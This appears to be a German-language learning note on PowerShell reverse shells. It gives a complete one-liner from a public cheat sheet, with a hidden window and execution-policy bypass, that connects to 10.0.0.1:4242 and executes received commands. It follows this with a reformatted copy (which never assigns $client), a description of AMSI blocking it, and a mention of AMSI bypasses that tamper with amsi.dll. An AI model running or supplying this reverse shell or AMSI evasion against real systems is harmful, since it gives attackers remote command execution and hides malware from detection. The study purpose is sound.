# Learning zur Reverse Shell



One Liner Reverse Shell in einer Powershell
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Quelle: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#powershell

In Powershell umgeschrieben sieht der Code so aus:

```powershell
New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);
$stream = $client.GetStream()

[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2  = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()}
    
$client.Close()
```

Führt man den Code in der Powershell aus. Kommt folgeden Fehlermeldung:

![image](https://github.com/user-attachments/assets/a9f07a42-b9cc-44c4-8627-e6568bd53662)

Die Fehlermeldung wird durch das Antimalware Scan Interface (kurz. AMSI) aufgerufen. AMSI analysiert den eingegeben Code auf Strukturen bekannter Schadsoftware. [Microsoft](https://learn.microsoft.com/de-de/windows/win32/amsi/antimalware-scan-interface-portal) nutzt AMSI für:
- Benutzerkontensteuerung bzw. UAC (Erhöhung von Rechten für EXE-, COM-, MSI- oder ActiveX-Installation)
- PowerShell (Skripts, interaktive Verwendung und dynamische Codeauswertung)
- Windows Script Host („wscript.exe“ und „cscript.exe“)
- JavaScript und VBScript
- VBA-Makros in Office

AMSI ist kein unbekanntes System, weshalb es einigen Anwendern gelungen einen Bypass zu erschaffen. Dazu wird die `amsi.dll` mit dem Ziel manipuliert, dass bosthafter Code als sauber zu indentifiziert wird.    
